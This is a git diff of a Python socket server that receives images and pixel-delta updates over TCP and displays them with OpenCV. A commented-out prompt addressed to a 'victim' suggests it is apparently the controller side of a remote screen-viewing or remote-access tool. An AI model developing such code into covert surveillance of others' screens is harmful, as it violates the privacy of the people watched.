@@ -1,9 +1,7 @@
 import socket
 import cv2
 import numpy as np
-import sys
-from PIL import Image
-from io import BytesIO
+import traceback
 
 
 def create_blank(image, changedBytes):
@@ -12,17 +10,36 @@ def create_blank(image, changedBytes):
     # data[0] = Height , data[1] = Width
 
     try:
-        for i in range(2, int((len(changedBytes) - 2) / 4)):
+        # print("before loop: length is " + str(len(changedBytes)))
+        for i in range(0, len(changedBytes), 16):
             # Fill image with color
-            image[int.from_bytes(changedBytes[i], byteorder="big", signed=True)] = tuple(
-                (
-                    int.from_bytes(changedBytes[(i + 1) * 4:(i + 1) * 4 + 4], byteorder='big', signed=True),
-                    int.from_bytes(changedBytes[(i + 2) * 4:(i + 2) * 4 + 4], byteorder='big', signed=True),
-                    int.from_bytes(changedBytes[(i + 3) * 4:(i + 3) * 4 + 4], byteorder='big', signed=True)))
+            # print("in loop: i is " + str(i) + " and length is " + str(len(changedBytes)))
+            index = int.from_bytes(changedBytes[i:i + 4], byteorder="big", signed=True)
+            x_ax = int(index / 640 / 3)
+            y_ax = int((index % 640) / 3)
+            image[x_ax, y_ax][0] = np.uint8(int.from_bytes(changedBytes[(i + 1) * 4:(i + 1) * 4 + 4], byteorder='big',
+                                                           signed=True))
+            image[x_ax, y_ax][1] = np.uint8(int.from_bytes(changedBytes[(i + 2) * 4:(i + 2) * 4 + 4], byteorder='big',
+                                                           signed=True))
+            image[x_ax, y_ax][2] = np.uint8(int.from_bytes(changedBytes[(i + 3) * 4:(i + 3) * 4 + 4], byteorder='big',
+                                                           signed=True))
 
-    except Exception:
-        cv2.imwrite("Test1.jpg", image)
+            # image[index] = int.from_bytes(changedBytes[(i + 1) * 4:(i + 1) * 4 + 4], byteorder='big', signed=True)
+            # image[index + 1] = int.from_bytes(changedBytes[(i + 2) * 4:(i + 2) * 4 + 4], byteorder='big', signed=True)
+            # image[index + 2] = int.from_bytes(changedBytes[(i + 3) * 4:(i + 3) * 4 + 4], byteorder='big', signed=True)
+
+            # image[int.from_bytes(changedBytes[i:i + 4], byteorder="big", signed=True)] = tuple(
+            #     (
+            #         int.from_bytes(changedBytes[(i + 1) * 4:(i + 1) * 4 + 4], byteorder='big', signed=True),
+            #         int.from_bytes(changedBytes[(i + 2) * 4:(i + 2) * 4 + 4], byteorder='big', signed=True),
+            #         int.from_bytes(changedBytes[(i + 3) * 4:(i + 3) * 4 + 4], byteorder='big', signed=True)))
+
+    except Exception as e:
+        # cv2.imwrite("Test1.jpg", image)
         print("Exception on {i}".format(i=i))
+        return image
+
+    return image
 
 
 s = socket.socket()
@@ -38,12 +55,29 @@ def server():
     # command = input('Please enter a command to the victim\n')
     # server_socket.send(command.encode('utf-8'))
 
-    data = server_socket.recv(10000000)
+    # Receiving the image for the first time
+
+    data_size = server_socket.recv(30).decode()
+    print(data_size)
+    data = server_socket.recv(int(data_size))
     data = np.asarray(bytearray(data), dtype="uint8")
     image = cv2.imdecode(data, cv2.IMREAD_COLOR)
-    cv2.imshow("Test", image)
-    cv2.waitKey()
-    # create_blank(data)
+    # cv2.waitKey()
+    while True:
+        cv2.imshow("Test", image)
+        data_size = server_socket.recv(7).decode()
+
+        print(data_size)
+        data = server_socket.recv(int(data_size))
+        # data = np.asarray(bytearray(data), dtype="uint8")
+        # image = cv2.imdecode(data, cv2.IMREAD_COLOR)
+
+        # data here is changedBytes
+        if data is None:
+            continue
+
+        image = create_blank(image, data)
+        cv2.imshow("Test", image)
 
     server_socket.close()
 
